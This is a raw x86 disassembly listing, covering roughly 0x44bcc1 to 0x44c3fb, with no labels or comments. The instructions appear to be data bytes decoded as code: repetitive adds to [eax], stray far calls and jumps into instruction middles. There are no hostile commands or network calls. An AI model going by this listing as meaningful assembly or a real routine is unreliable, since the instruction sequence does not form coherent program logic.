  44bcc1:	add    BYTE PTR [eax],dl
  44bcc3:	mov    ds:0x30ca5024,al
  44bcc8:	xor    BYTE PTR [eax+0x78000086],al
  44bcce:	add    BYTE PTR [eax],al
  44bcd0:	add    BYTE PTR [edx],al
  44bcd2:	data16 and BYTE PTR [edx+0x204020],0x4
  44bcda:	add    al,0x80
  44bcdc:	adc    BYTE PTR [edx+0x24],cl
  44bcdf:	mov    DWORD PTR [ecx],0x4000106a
  44bce5:	add    BYTE PTR [eax],cl
  44bce7:	add    DWORD PTR [eax],0x0
  44bcea:	add    DWORD PTR [edx+0x1],eax
  44bced:	adc    BYTE PTR ss:[eax+0x41],0x40
  44bcf2:	add    al,dl
  44bcf4:	pop    es
  44bcf5:	pop    edi
  44bcf6:	add    BYTE PTR [eax+0xe00018],cl
  44bcfc:	or     ecx,DWORD PTR [eax+ecx*1+0x3]
  44bd00:	ret    0x1908
  44bd03:	dec    edx
  44bd04:	or     BYTE PTR [edx],ah
  44bd06:	adc    BYTE PTR [eax+0x6218c000],cl
  44bd0c:	mov    eax,ds:0xc0940281
  44bd11:	add    DWORD PTR [eax-0x3fadffbc],eax
  44bd17:	and    esp,esp
  44bd19:	add    al,0x0
  44bd1b:	add    BYTE PTR [eax],al
  44bd1d:	mov    WORD PTR [eax],es
  44bd1f:	sbb    al,0x41
  44bd21:	add    BYTE PTR [eax+eax*1+0x4a0022],al
  44bd28:	adc    DWORD PTR ds:0x600800,edx
  44bd2e:	adc    BYTE PTR [eax],al
  44bd30:	add    BYTE PTR [edx],cl
  44bd32:	or     BYTE PTR [eax+eiz*1],al
  44bd35:	or     BYTE PTR [eax],ch
  44bd37:	call   0xc445d79c
  44bd3c:	and    BYTE PTR [eax+eax*1+0x48],0x0
  44bd41:	or     cl,BYTE PTR [eax+0x22a48160]
  44bd47:	and    BYTE PTR [ecx],dl
  44bd49:	and    DWORD PTR [eax+0x8],edi
  44bd4c:	adc    BYTE PTR [ecx],0x48
  44bd4f:	cmp    al,al
  44bd51:	add    BYTE PTR [eax],cl
  44bd53:	and    al,0xce
  44bd55:	or     BYTE PTR [eax],al
  44bd57:	xor    ah,ah
  44bd59:	adc    BYTE PTR [eax],ah
  44bd5b:	add    BYTE PTR [eax],al
  44bd5d:	add    ecx,DWORD PTR [eax+edx*1]
  44bd60:	and    DWORD PTR [eax],eax
  44bd62:	add    BYTE PTR [eax+0x4],al
  44bd65:	mov    eax,ds:0x121201
  44bd6a:	add    BYTE PTR [edx],al
  44bd6c:	ss inc edx
  44bd6e:	add    al,BYTE PTR [eax]
  44bd70:	test   BYTE PTR [eax+eax*4],dl
  44bd73:	add    BYTE PTR [eax],al
  44bd75:	adc    BYTE PTR [edx],0x1
  44bd78:	inc    eax
  44bd79:	add    al,0x0
  44bd7b:	and    ah,al
  44bd7d:	add    BYTE PTR [edx],dl
  44bd7f:	and    BYTE PTR [ecx],al
  44bd81:	add    BYTE PTR [eax+eax*1+0x0],al
  44bd85:	inc    edx
  44bd86:	or     BYTE PTR [eax],0x11
  44bd89:	add    DWORD PTR ds:0x402400,eax
  44bd8f:	sbb    BYTE PTR [eax],al
  44bd91:	add    al,0x0
  44bd93:	add    BYTE PTR [eax],cl
  44bd95:	inc    esi
  44bd96:	inc    eax
  44bd97:	sub    al,0x1
  44bd99:	add    BYTE PTR [edx+esi*1],ah
  44bd9c:	dec    eax
  44bd9d:	add    BYTE PTR [eax+ecx*4+0x2c002000],al
  44bda4:	pusha  
  44bda5:	and    BYTE PTR [eax+ecx*4],al
  44bda8:	and    BYTE PTR [esp+ecx*4+0x2000210],0x10
  44bdb0:	add    DWORD PTR [ecx],0x84180440
  44bdb6:	cmp    BYTE PTR [eax+0x0],al
  44bdb9:	add    BYTE PTR [eax],cl
  44bdbb:	and    eax,0x401a2d00
  44bdc0:	and    BYTE PTR [edx-0x74],al
  44bdc3:	add    ah,BYTE PTR [edx+0x0]
  44bdc6:	add    BYTE PTR [esi+ebx*4],al
  44bdc9:	adc    BYTE PTR [ecx],ch
  44bdcb:	and    al,0x14
  44bdcd:	add    BYTE PTR [eax],dl
  44bdcf:	call   0x290:0x18000000
  44bdd6:	rol    BYTE PTR [ecx],1
  44bdd8:	adc    BYTE PTR [eax],al
  44bdda:	jo     0x44bddc
  44bddc:	or     DWORD PTR [eax],edx
  44bdde:	or     BYTE PTR [ecx],ah
  44bde0:	mov    WORD PTR [eax],fs
  44bde2:	loop   0x44bd64
  44bde4:	mov    eax,0x8870c008
  44bde9:	adc    al,al
  44bdeb:	rol    DWORD PTR [ecx],0x18
  44bdee:	inc    eax
  44bdef:	add    BYTE PTR [ebx],al
  44bdf1:	adc    al,0x24
  44bdf3:	and    eax,DWORD PTR [eax+0x0]
  44bdf6:	or     al,BYTE PTR [ebx-0x80]
  44bdf9:	and    BYTE PTR [edx+0x0],al
  44bdfc:	add    DWORD PTR [eax],edx
  44bdfe:	and    eax,DWORD PTR [eax+0x1214401]
  44be04:	add    BYTE PTR [eax+eax*1],0x9
  44be08:	pusha  
  44be09:	and    al,BYTE PTR [eax+0x28]
  44be0c:	add    DWORD PTR [eax+0x42000811],eax
  44be12:	add    ah,BYTE PTR [edx]
  44be14:	add    BYTE PTR [ecx+eax*1],ch
  44be17:	dec    eax
  44be18:	push   ss
  44be19:	cmp    BYTE PTR [ecx-0x7fe7ffbe],ah
  44be1f:	xchg   esp,eax
  44be20:	add    BYTE PTR [eax+eiz*1],al
  44be23:	add    al,BYTE PTR [ecx]
  44be25:	dec    ecx
  44be26:	add    BYTE PTR [eax],al
  44be28:	add    BYTE PTR [edx],al
  44be2a:	add    DWORD PTR [eax],ecx
  44be2c:	add    al,0x2
  44be2e:	inc    esp
  44be2f:	sub    BYTE PTR [ecx],al
  44be31:	xchg   BYTE PTR [eax],al
  44be33:	add    BYTE PTR [edx],al
  44be35:	es xchg esi,eax
  44be37:	dec    eax
  44be38:	add    BYTE PTR [esp+ecx*1+0x1801a462],al
  44be3f:	lock adc BYTE PTR [ecx],cl
  44be42:	add    DWORD PTR [edx+0x2c090c19],0x4035a010
  44be4c:	add    BYTE PTR [ebx],ah
  44be4e:	add    BYTE PTR [eax],0x22
  44be51:	add    BYTE PTR [edx+0x66],cl
  44be54:	push   esi
  44be55:	or     ecx,DWORD PTR [eax]
  44be57:	inc    eax
  44be58:	adc    BYTE PTR [eax],al
  44be5a:	xor    BYTE PTR [eax+0x40208ca3],al
  44be60:	add    DWORD PTR [edx],ecx
  44be62:	mov    BYTE PTR [esi-0x3e7f4000],ah
  44be68:	add    BYTE PTR [ecx],ah
  44be6a:	add    BYTE PTR [eax],al
  44be6c:	test   BYTE PTR [eax],cl
  44be6e:	add    al,0x14
  44be70:	add    BYTE PTR [eax],al
  44be72:	push   edx
  44be73:	and    BYTE PTR [eax+0x0],al
  44be76:	and    BYTE PTR [edx+0x0],ch
  44be79:	add    BYTE PTR [eax],al
  44be7b:	dec    eax
  44be7c:	or     BYTE PTR [eax],al
  44be7e:	add    al,BYTE PTR [esi]
  44be80:	pop    eax
  44be81:	add    BYTE PTR [eax],cl
  44be83:	inc    eax
  44be84:	sbb    al,0x44
  44be86:	pusha  
  44be87:	xor    al,BYTE PTR [edx+0x32]
  44be8a:	add    BYTE PTR [ecx],0xc0
  44be8d:	and    al,BYTE PTR [eax+0x482041]
  44be93:	inc    eax
  44be94:	push   cs
  44be95:	or     BYTE PTR [eax+ecx*4],al
  44be98:	rcl    BYTE PTR [eax],0x51
  44be9b:	mov    WORD PTR [eax+0x58004100],es
  44bea1:	adc    al,BYTE PTR [edx]
  44bea3:	sub    BYTE PTR [eax+eax*1+0x1100a840],al
  44beaa:	add    BYTE PTR [ecx],cl
  44beac:	add    BYTE PTR [eax],al
  44beae:	adc    DWORD PTR [eax],eax
  44beb0:	add    al,0x39
  44beb2:	inc    edx
  44beb3:	add    BYTE PTR [esi+eax*8+0x902b588],dl
  44beba:	sbb    cl,ah
  44bebc:	and    BYTE PTR [ecx+eiz*2+0x40],al
  44bec0:	and    BYTE PTR [eax],bh
  44bec2:	add    BYTE PTR [eax],al
  44bec4:	add    BYTE PTR [edx+0x4909400],al
  44beca:	or     BYTE PTR [eax+0x0],0x48
  44bece:	lock adc eax,0x20b21000
  44bed4:	and    BYTE PTR [ebx],al
  44bed6:	inc    eax
  44bed7:	or     BYTE PTR [eax+0x400818],al
  44bedd:	inc    esp
  44bede:	dec    esp
  44bedf:	push   eax
  44bee0:	add    DWORD PTR [eax],0xf2081048
  44bee6:	add    BYTE PTR [eax-0x60],ah
  44bee9:	nop
  44beea:	adc    BYTE PTR [ecx],ah
  44beec:	mov    DWORD PTR [eax],edx
  44beee:	xor    cl,BYTE PTR [eax]
  44bef0:	add    eax,esi
  44bef2:	adc    dh,dl
  44bef4:	or     BYTE PTR [eax],al
  44bef6:	add    BYTE PTR [eax],0x12
  44bef9:	inc    eax
  44befa:	add    BYTE PTR [eax],al
  44befc:	and    BYTE PTR [eax],0x50
  44beff:	add    DWORD PTR [eax+0x0],esp
  44bf02:	popa   
  44bf03:	add    BYTE PTR [eax],dh
  44bf05:	lds    edx,FWORD PTR [ecx+0xc498803]
  44bf0b:	add    BYTE PTR [ecx+0x51],al
  44bf0e:	add    BYTE PTR [edx],al
  44bf10:	add    BYTE PTR [eax+0x20],al
  44bf13:	add    BYTE PTR [ecx-0x3e],al
  44bf16:	add    al,0x1
  44bf18:	inc    eax
  44bf19:	add    BYTE PTR [eax],ah
  44bf1b:	fadd   DWORD PTR [eax]
  44bf1d:	adc    dl,BYTE PTR [ecx]
  44bf1f:	mov    eax,ds:0x2004020c
  44bf24:	pusha  
  44bf25:	add    BYTE PTR [eax],al
  44bf27:	add    al,BYTE PTR [eax]
  44bf29:	dec    edx
  44bf2a:	add    BYTE PTR [ecx+esi*4],al
  44bf2d:	adc    BYTE PTR [eax+0x1],dl
  44bf30:	add    eax,0xc00000
  44bf35:	or     BYTE PTR [eax],0x80
  44bf38:	add    BYTE PTR [edi],al
  44bf3a:	add    BYTE PTR [eax+0x20800809],al
  44bf40:	add    BYTE PTR [eax+0x0],0x1
  44bf44:	and    BYTE PTR [esi],dl
  44bf46:	inc    eax
  44bf47:	add    BYTE PTR [edx],bl
  44bf49:	xor    BYTE PTR [edx],al
  44bf4b:	dec    eax
  44bf4c:	push   ss
  44bf4d:	adc    al,0x60
  44bf4f:	mov    al,ds:0xa000580
  44bf54:	add    BYTE PTR [eax],ch
  44bf56:	add    BYTE PTR [ecx+ecx*1],cl
  44bf59:	add    al,BYTE PTR [eax]
  44bf5b:	and    BYTE PTR [eax+0x0],dl
  44bf5e:	push   esp
  44bf5f:	lds    ecx,FWORD PTR [eax]
  44bf61:	inc    edi
  44bf62:	mov    BYTE PTR [ecx],ch
  44bf64:	add    cl,al
  44bf66:	rol    DWORD PTR [eax+0x400800c0],cl
  44bf6c:	or     BYTE PTR [eax+0x30],dl
  44bf6f:	test   BYTE PTR [eax+0x4],ah
  44bf72:	xor    eax,0x40c3c5d8
  44bf77:	add    BYTE PTR [ebp+0x40046019],al
  44bf7d:	add    BYTE PTR [eax+0x8],al
  44bf80:	add    DWORD PTR ds:0x43088300,eax
  44bf86:	adc    BYTE PTR [ecx],al
  44bf88:	add    BYTE PTR [eax+0x0],al
  44bf8b:	add    BYTE PTR [esi],dl
  44bf8d:	sub    BYTE PTR [edx],bl
  44bf8f:	inc    esp
  44bf90:	adc    BYTE PTR [eax],cl
  44bf92:	or     ecx,DWORD PTR [eax]
  44bf94:	xchg   esp,eax
  44bf95:	add    al,al
  44bf97:	or     BYTE PTR [eax],0xe8
  44bf9a:	dec    eax
  44bf9b:	inc    eax
  44bf9c:	dec    eax
  44bf9d:	add    BYTE PTR [ecx],al
  44bf9f:	add    DWORD PTR [eax+0x2a],eax
  44bfa2:	add    BYTE PTR [eax+0xa620a4],al
  44bfa8:	inc    eax
  44bfa9:	add    DWORD PTR [eax+edx*4],esi
  44bfac:	push   es
  44bfad:	shl    BYTE PTR [eax-0x48],1
  44bfb0:	xor    DWORD PTR [eax+0x3],eax
  44bfb3:	add    DWORD PTR [esp+eiz*4],ebp
  44bfb6:	adc    BYTE PTR [eax-0x7f3f7e65],bl
  44bfbc:	push   edx
  44bfbd:	cmp    BYTE PTR [edx],ah
  44bfbf:	adc    BYTE PTR [ebx],al
  44bfc1:	and    DWORD PTR [eax],eax
  44bfc3:	adc    BYTE PTR [eax+0x0],al
  44bfc6:	xchg   ebx,eax
  44bfc7:	call   0x2c00:0x40105010
  44bfce:	and    al,0x6
  44bfd0:	add    DWORD PTR [edx],eax
  44bfd2:	add    BYTE PTR [eax-0x20],al
  44bfd5:	add    BYTE PTR [eax],al
  44bfd7:	add    ah,dh
  44bfd9:	dec    edx
  44bfda:	cwde   
  44bfdb:	add    al,BYTE PTR [edx+0x24000002]
  44bfe1:	add    DWORD PTR [edi+0x4548008],eax
  44bfe7:	add    BYTE PTR [eax+0x21020401],0x0
  44bfee:	add    BYTE PTR [edx],bh
  44bff0:	sub    DWORD PTR [eax+0x20880052],eax
  44bff6:	or     BYTE PTR [ecx+0x3418080],al
  44bffc:	add    al,BYTE PTR [eax]
  44bffe:	add    BYTE PTR [eax],al
  44c000:	add    dl,BYTE PTR [eax-0x80]
  44c003:	and    dl,BYTE PTR [eax+0x19081520]
  44c009:	add    BYTE PTR [eax],ch
  44c00b:	xor    BYTE PTR [edx],al
  44c00d:	inc    esp
  44c00e:	sbb    dl,bl
  44c010:	or     BYTE PTR [eax-0x48],al
  44c013:	add    BYTE PTR [eax+0x4028c802],ch
  44c019:	pusha  
  44c01a:	add    al,BYTE PTR [edx+0x34c000]
  44c020:	adc    BYTE PTR [ecx],al
  44c022:	sbb    BYTE PTR [eax-0x5d],al
  44c025:	inc    eax
  44c026:	add    BYTE PTR [ebx],al
  44c028:	loopne 0x44c02a
  44c02a:	cwde   
  44c02b:	pushf  
  44c02c:	add    eax,0x10004895
  44c031:	or     DWORD PTR [edx],eax
  44c033:	or     dl,BYTE PTR [eax+ecx*1-0x7fbf7c3a]
  44c03a:	xor    BYTE PTR [eax],al
  44c03c:	add    BYTE PTR [ecx],al
  44c03e:	inc    eax
  44c03f:	add    BYTE PTR [eax+0x0],al
  44c042:	add    dl,BYTE PTR [ecx]
  44c044:	adc    ah,BYTE PTR [eax+eax*1]
  44c047:	add    BYTE PTR [eax],0x0
  44c04a:	inc    eax
  44c04b:	pusha  
  44c04c:	adc    cl,BYTE PTR [eax+0x40]
  44c04f:	adc    BYTE PTR [edi],cl
  44c051:	xchg   ecx,eax
  44c052:	add    al,0x30
  44c054:	adc    al,0x30
  44c056:	mov    eax,ds:0x8304320
  44c05b:	or     al,0x16
  44c05d:	aas    
  44c05e:	popa   
  44c05f:	pop    eax
  44c060:	adc    BYTE PTR [eax],al
  44c062:	add    ah,BYTE PTR [eax]
  44c064:	or     eax,DWORD PTR [edx]
  44c066:	inc    eax
  44c067:	hlt    
  44c068:	inc    eax
  44c069:	adc    BYTE PTR [eax],al
  44c06b:	cmovo  esp,DWORD PTR [eax]
  44c06e:	inc    ecx
  44c06f:	and    cl,BYTE PTR [eax+0x20]
  44c072:	and    DWORD PTR [ecx],esp
  44c074:	add    DWORD PTR [eax+0x0],eax
  44c077:	add    BYTE PTR [eax],al
  44c079:	add    bl,BYTE PTR ds:0x8000100
  44c07f:	add    BYTE PTR [esi],al
  44c081:	or     BYTE PTR [eax],al
  44c083:	adc    BYTE PTR [eax],al
  44c085:	add    BYTE PTR [eax],cl
  44c087:	add    al,ah
  44c089:	or     DWORD PTR [eax-0x70],eax
  44c08c:	xchg   BYTE PTR [eax],ch
  44c08e:	add    BYTE PTR [eax],al
  44c090:	add    BYTE PTR [eax+eax*1],cl
  44c093:	and    DWORD PTR [eax],edx
  44c095:	shl    BYTE PTR [eax],0x88
  44c098:	add    DWORD PTR [eax+ecx*1],eax
  44c09b:	xchg   edx,eax
  44c09c:	nop
  44c09d:	add    al,0xc0
  44c09f:	add    DWORD PTR [eax+eax*2],eax
  44c0a2:	inc    eax
  44c0a3:	add    BYTE PTR [eax],al
  44c0a5:	or     BYTE PTR [eax],0x0
  44c0a8:	add    BYTE PTR [eax],cl
  44c0aa:	or     BYTE PTR [ebx],dh
  44c0ac:	and    al,0x0
  44c0ae:	add    BYTE PTR [eax],al
  44c0b0:	adc    ah,BYTE PTR [eax]
  44c0b2:	ror    BYTE PTR [ecx],1
  44c0b4:	add    al,0x61
  44c0b6:	add    al,BYTE PTR [eax+0x8]
  44c0b9:	and    BYTE PTR [ecx],ah
  44c0bb:	test   al,0x8
  44c0bd:	inc    ebp
  44c0be:	xor    BYTE PTR [eax],al
  44c0c0:	add    dl,BYTE PTR [eax]
  44c0c2:	add    BYTE PTR [eax],0x0
  44c0c5:	add    BYTE PTR [edx+0x808],al
  44c0cb:	add    DWORD PTR [eax],0x8
  44c0ce:	add    BYTE PTR [eax+eiz*1],al
  44c0d1:	add    BYTE PTR [ebx+0x2050008],dl
  44c0d7:	push   es
  44c0d8:	fsubr  DWORD PTR [edi]
  44c0da:	add    DWORD PTR [eax],eax
  44c0dc:	and    BYTE PTR [esi-0x70],al
  44c0df:	add    BYTE PTR [edx+eax*1],al
  44c0e2:	sbb    al,0x44
  44c0e4:	adc    cl,BYTE PTR [eax+eax*1]
  44c0e7:	add    DWORD PTR [eax+eax*4+0x1202926],eax
  44c0ee:	inc    eax
  44c0ef:	add    BYTE PTR [eax-0x7e],al
  44c0f2:	add    BYTE PTR [esi+0x8040100],cl
  44c0f8:	inc    ecx
  44c0f9:	add    BYTE PTR [ecx],0x40
  44c0fc:	sbb    al,0x4
  44c0fe:	and    al,al
  44c100:	add    BYTE PTR [eax],al
  44c102:	or     esi,DWORD PTR [esi+0x8c19000]
  44c108:	add    BYTE PTR [eax],al
  44c10a:	add    BYTE PTR [eax],al
  44c10c:	add    al,0x40
  44c10e:	repnz test al,0x41
  44c111:	inc    esp
  44c112:	call   0xc54197
  44c117:	inc    edx
  44c118:	pop    es
  44c119:	add    BYTE PTR [eax],0x10
  44c11c:	adc    BYTE PTR [ecx+0x4240e815],dl
  44c122:	sub    BYTE PTR [eax],0x80
  44c125:	and    BYTE PTR [eax],al
  44c127:	or     al,0x10
  44c129:	inc    edx
  44c12a:	inc    eax
  44c12b:	or     al,0x4
  44c12d:	add    al,0x80
  44c12f:	or     DWORD PTR [ebx+0x38],0x920c0
  44c136:	add    al,0x48
  44c138:	and    ch,BYTE PTR [eax]
  44c13a:	adc    BYTE PTR [eax],al
  44c13c:	dec    ebx
  44c13d:	or     BYTE PTR [ecx],ah
  44c13f:	pop    es
  44c140:	lock adc BYTE PTR [eax],cl
  44c143:	enter  0x2060,0x8c
  44c147:	add    BYTE PTR [eax],al
  44c149:	mov    DWORD PTR [eax-0x7f],edx
  44c14c:	or     BYTE PTR [eax],al
  44c14e:	inc    eax
  44c14f:	add    al,BYTE PTR [eax-0x80]
  44c152:	jb     0x44c154
  44c154:	and    eax,DWORD PTR [eax+0x2b]
  44c157:	cmp    al,0x92
  44c159:	add    BYTE PTR [eax+0x42],cl
  44c15c:	add    BYTE PTR [ecx],cl
  44c15e:	nop
  44c15f:	rol    BYTE PTR [eax+0x4910400],1
  44c165:	popa   
  44c166:	adc    DWORD PTR [eax-0x58],eax
  44c169:	adc    DWORD PTR [esi+0x280020b],esp
  44c16f:	nop
  44c170:	add    BYTE PTR [esi+0x1180c140],ch
  44c176:	call   0x8581:0x10018618
  44c17d:	dec    ebx
  44c17e:	dec    esi
  44c17f:	adc    BYTE PTR [ecx],cl
  44c181:	add    BYTE PTR [ecx],al
  44c183:	add    al,0x0
  44c185:	add    BYTE PTR [esi+0x20],al
  44c188:	inc    eax
  44c189:	ret    0x6154
  44c18c:	add    DWORD PTR [ecx],eax
  44c18e:	and    BYTE PTR [edx+0x0],dl
  44c191:	add    BYTE PTR [eax],al
  44c193:	dec    eax
  44c194:	add    BYTE PTR [edx+esi*2],al
  44c197:	add    ah,ah
  44c199:	dec    ecx
  44c19a:	add    BYTE PTR [eax],dl
  44c19c:	adc    BYTE PTR [eax],al
  44c19e:	or     BYTE PTR [eax],cl
  44c1a0:	and    BYTE PTR [esi],ah
  44c1a2:	xor    BYTE PTR [eax],cl
  44c1a4:	and    eax,0x6944010b
  44c1a9:	rol    BYTE PTR [eax+0x5],0xc4
  44c1ad:	inc    eax
  44c1ae:	add    BYTE PTR [eax+0x208900],al
  44c1b4:	or     BYTE PTR [edx],al
  44c1b6:	add    DWORD PTR [eax-0x7baef5e0],esp
  44c1bc:	add    BYTE PTR [eax],al
  44c1be:	or     al,0x8
  44c1c0:	sbb    BYTE PTR [ecx],ch
  44c1c2:	push   eax
  44c1c3:	shr    BYTE PTR [ecx*4+0x42051901],0x0
  44c1cb:	adc    BYTE PTR [eax],0x30
  44c1ce:	and    BYTE PTR [eax+0x2],0xb6
  44c1d2:	inc    ebp
  44c1d3:	add    BYTE PTR [edx+0x24],ah
  44c1d6:	mov    al,BYTE PTR [eax]
  44c1d8:	add    DWORD PTR [eax],eax
  44c1da:	bound  eax,QWORD PTR [eax+0x5c10cb20]
  44c1e0:	adc    BYTE PTR [eax],dh
  44c1e2:	sbb    al,0x8
  44c1e4:	add    eax,0x80503881
  44c1e9:	add    al,0xa0
  44c1eb:	shr    BYTE PTR [eax],1
  44c1ed:	add    BYTE PTR [eax],bl
  44c1ef:	pop    eax
  44c1f0:	les    esp,FWORD PTR [eax+0x1c2e00b7]
  44c1f6:	add    BYTE PTR [eax],ch
  44c1f8:	adc    DWORD PTR [eax],eax
  44c1fa:	push   edx
  44c1fb:	add    BYTE PTR [eax],0xaa
  44c1fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c1ff:	add    BYTE PTR [eax],0x20
  44c202:	and    BYTE PTR [eax],al
  44c204:	or     eax,DWORD PTR [eax+0x20]
  44c207:	and    cl,BYTE PTR [eax+0x8]
  44c20a:	add    BYTE PTR [eax-0x80],al
  44c20d:	dec    edx
  44c20e:	add    al,0x4
  44c210:	dec    eax
  44c211:	sbb    al,0xa1
  44c213:	mov    eax,DWORD PTR [eax+eiz*2+0x0]
  44c217:	add    al,BYTE PTR [eax+0x1]
  44c21a:	jb     0x44c21c
  44c21c:	push   ss
  44c21d:	fs add al,0x0
  44c220:	inc    esi
  44c221:	add    al,BYTE PTR [eax]
  44c223:	add    BYTE PTR [eax],al
  44c225:	adc    al,0x10
  44c227:	adc    DWORD PTR [eax+0x1500b408],esp
  44c22d:	or     BYTE PTR [edi],ah
  44c22f:	and    BYTE PTR [edx],al
  44c231:	adc    BYTE PTR [edx],cl
  44c233:	and    DWORD PTR [esp+ecx*1+0x0],0x40416000
  44c23b:	and    al,0x4
  44c23d:	sub    BYTE PTR [eax+0x40],al
  44c240:	and    BYTE PTR [ecx],ah
  44c242:	xor    BYTE PTR [eax],al
  44c244:	add    BYTE PTR [eax+eax*1],al
  44c247:	adc    DWORD PTR [eax],ecx
  44c249:	inc    esi
  44c24a:	add    BYTE PTR [esi+ecx*1],al
  44c24d:	add    BYTE PTR [ecx],ah
  44c24f:	add    DWORD PTR [eax],eax
  44c251:	add    BYTE PTR [eax+0x21088022],al
  44c257:	adc    BYTE PTR [edx+0x6220c005],al
  44c25d:	add    BYTE PTR [edx],al
  44c25f:	loopne 0x44c261
  44c261:	inc    eax
  44c262:	add    al,0x1
  44c264:	add    BYTE PTR [eax],dl
  44c266:	add    BYTE PTR [eax],al
  44c268:	add    BYTE PTR [eax+0x1],0x81
  44c26c:	push   es
  44c26d:	adc    eax,DWORD PTR [eax+eax*1+0x4]
  44c271:	add    bl,dh
  44c273:	adc    BYTE PTR [esi],al
  44c275:	add    BYTE PTR [esi],al
  44c277:	add    BYTE PTR [eax],ah
  44c279:	add    al,0x1
  44c27b:	sbb    DWORD PTR [eax],0x0
  44c27e:	and    BYTE PTR [eax+0x4b],al
  44c281:	add    BYTE PTR [ebx+0x62],ah
  44c284:	and    al,al
  44c286:	adc    al,0x1
  44c289:	and    eax,0x44400080
  44c28e:	dec    ebx
  44c28f:	and    BYTE PTR [edx],dl
  44c291:	add    BYTE PTR [eax+edx*2],0x81
  44c295:	dec    eax
  44c296:	ror    BYTE PTR [eax],1
  44c298:	or     BYTE PTR [eax],cl
  44c29a:	or     al,BYTE PTR [edx]
  44c29c:	adc    DWORD PTR [eax+0x2000106],edx
  44c2a2:	add    BYTE PTR [eax-0x6f],0x0
  44c2a6:	inc    eax
  44c2a7:	add    DWORD PTR [eax],eax
  44c2a9:	add    BYTE PTR [eax],cl
  44c2ab:	add    DWORD PTR [edx+edx*1+0x10],eax
  44c2af:	inc    eax
  44c2b0:	add    al,al
  44c2b2:	sbb    BYTE PTR [eax],ah
  44c2b4:	and    BYTE PTR [eax+0x44],ah
  44c2b7:	add    BYTE PTR [eax],al
  44c2b9:	and    BYTE PTR [eax],al
  44c2bb:	ret    0x841
  44c2be:	add    al,BYTE PTR [eax]
  44c2c0:	mov    BYTE PTR cs:[eax],al
  44c2c3:	add    al,BYTE PTR [esi+0x404798]
  44c2c9:	or     al,0x40
  44c2cb:	add    BYTE PTR [eax+0x69],cl
  44c2ce:	add    BYTE PTR [eax],dh
  44c2d0:	add    BYTE PTR [ecx],ch
  44c2d2:	inc    eax
  44c2d3:	mov    WORD PTR [eax+eax*1],fs
  44c2d6:	inc    eax
  44c2d7:	pop    eax
  44c2d8:	aam    0x84
  44c2da:	adc    dl,BYTE PTR [ecx+0x1027e101]
  44c2e0:	add    eax,DWORD PTR [edx]
  44c2e2:	mov    BYTE PTR ds:0xc51400e1,ah
  44c2e8:	add    BYTE PTR [edx],al
  44c2ea:	add    al,0x4
  44c2ec:	and    DWORD PTR [eax],eax
  44c2ee:	add    BYTE PTR [eax],al
  44c2f0:	sbb    BYTE PTR [ecx+0x0],al
  44c2f3:	and    BYTE PTR [ecx+0x0],ch
  44c2f6:	add    DWORD PTR [ebp+0x15110],0xefb8000
  44c300:	inc    eax
  44c301:	or     BYTE PTR [eax*1-0x1df4bffa],0x2
  44c309:	add    BYTE PTR [ecx+0x9010844],al
  44c30f:	or     cl,al
  44c311:	inc    eax
  44c312:	inc    eax
  44c313:	adc    bl,BYTE PTR [eax-0x2c]
  44c316:	inc    eax
  44c317:	mov    al,ds:0x80040
  44c31c:	add    BYTE PTR [ebx+0x60000418],al
  44c322:	add    al,0x10
  44c324:	add    esi,esp
  44c326:	add    cl,BYTE PTR [eax]
  44c328:	adc    BYTE PTR [edx+ecx*4-0x6edfdff8],dh
  44c32f:	or     BYTE PTR [edx],al
  44c331:	sbb    BYTE PTR [eax+0x7005852],dl
  44c337:	inc    esi
  44c338:	add    al,0xc0
  44c33a:	add    BYTE PTR [edx+0x101b066],al
  44c340:	or     DWORD PTR [eax+eiz*1],eax
  44c343:	add    BYTE PTR [eax+0x442b0000],0x48
  44c34a:	xor    dh,BYTE PTR [edx]
  44c34c:	xchg   edx,eax
  44c34d:	xchg   ecx,eax
  44c34e:	mov    BYTE PTR [eax+0x10],ah
  44c351:	xor    eax,DWORD PTR [esi]
  44c353:	inc    eax
  44c354:	or     eax,0x10100d
  44c359:	xor    BYTE PTR [eax+eiz*1],dl
  44c35c:	add    BYTE PTR [eax],al
  44c35e:	adc    BYTE PTR [eax],cl
  44c360:	xchg   edi,eax
  44c361:	adc    BYTE PTR [eax],al
  44c363:	add    al,0x8
  44c365:	add    BYTE PTR [esi-0x26fffae6],ch
  44c36b:	add    BYTE PTR [eax+0x5006181],al
  44c371:	add    BYTE PTR [eax+0x4e5026],ch
  44c377:	inc    eax
  44c378:	inc    eax
  44c379:	add    DWORD PTR [eax],eax
  44c37b:	or     BYTE PTR [ecx],cl
  44c37d:	add    BYTE PTR [eax],dh
  44c37f:	add    BYTE PTR [eax],ah
  44c381:	mov    BYTE PTR [eax+0x7050100],bl
  44c387:	add    BYTE PTR [eax],al
  44c389:	and    al,BYTE PTR [eax-0x80]
  44c38c:	inc    eax
  44c38d:	add    al,0x0
  44c38f:	or     DWORD PTR [eax],0x1307a00
  44c395:	add    BYTE PTR [ecx],al
  44c397:	inc    ebp
  44c398:	xchg   ecx,eax
  44c399:	add    cl,BYTE PTR [ebx+0x0]
  44c39c:	dec    eax
  44c39d:	add    BYTE PTR [eax-0x7d65df3f],al
  44c3a3:	adc    BYTE PTR [eax+0x10100010],dl
  44c3a9:	add    BYTE PTR [eax],al
  44c3ab:	rol    BYTE PTR [eax+0x32],0x1
  44c3af:	and    BYTE PTR [edi],ah
  44c3b1:	sbb    BYTE PTR [eax],0x61
  44c3b4:	rol    BYTE PTR [eax],0x4
  44c3b7:	xor    BYTE PTR [eax],ah
  44c3b9:	add    BYTE PTR [ebx+0x800822],dh
  44c3bf:	add    BYTE PTR [eax+eax*1+0x1],cl
  44c3c3:	and    DWORD PTR [eax],edx
  44c3c5:	add    al,dl
  44c3c7:	inc    esp
  44c3c8:	ja     0x44c428
  44c3ca:	add    DWORD PTR [ecx+0x9],eax
  44c3cd:	add    BYTE PTR [edx],al
  44c3cf:	or     BYTE PTR [ecx],dl
  44c3d1:	and    BYTE PTR [eax-0x6b],al
  44c3d4:	and    BYTE PTR [eax],cl
  44c3d6:	add    al,0x0
  44c3d8:	and    al,BYTE PTR [esi-0x36bff7cf]
  44c3de:	rol    BYTE PTR [ecx+0x48001],0x4
  44c3e5:	or     al,0x50
  44c3e7:	and    eax,0x9021c050
  44c3ec:	mov    ds:0x30c00040,al
  44c3f1:	pop    esp
  44c3f2:	add    BYTE PTR [eax],al
  44c3f4:	xor    BYTE PTR [edx+ecx*4],0x80
  44c3f8:	add    BYTE PTR [edx],0x4
  44c3fb:	sbb    BYTE PTR [edx+eax*4+0x0],0x54
